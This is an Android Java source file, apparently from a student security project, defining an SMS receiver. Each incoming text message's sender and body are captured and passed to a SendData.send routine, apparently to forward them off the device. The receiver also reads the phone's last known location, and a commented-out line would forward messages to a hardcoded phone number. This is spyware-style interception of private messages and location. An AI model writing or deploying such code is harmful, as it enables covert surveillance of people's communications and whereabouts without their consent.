package esgi.androsecurity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsMessage;
import android.widget.Toast;

import esgi.androsecurity.util.SendData;

/**
 * Created by Tensa on 03/02/2017.
 */

public class SMSReceiver extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent){

        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; i++){
            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            double lat = location.getLatitude();
            double lng = location.getLongitude();
            Toast.makeText(context,lat + " - " + lng,Toast.LENGTH_SHORT).show();
        }

        for (SmsMessage message : messages){

            String strMessageFrom = message.getDisplayOriginatingAddress();
            String strMessageBody = message.getDisplayMessageBody();
            String body = strMessageBody + " - " + strMessageFrom;

            //Toast.makeText(context, "From : " +strMessageFrom+"\nBody : "+strMessageBody, Toast.LENGTH_LONG).show();

            //SendSMS.send("0623717130",body,context);
            SendData.send(strMessageFrom,strMessageBody,context);
        }
    }
}
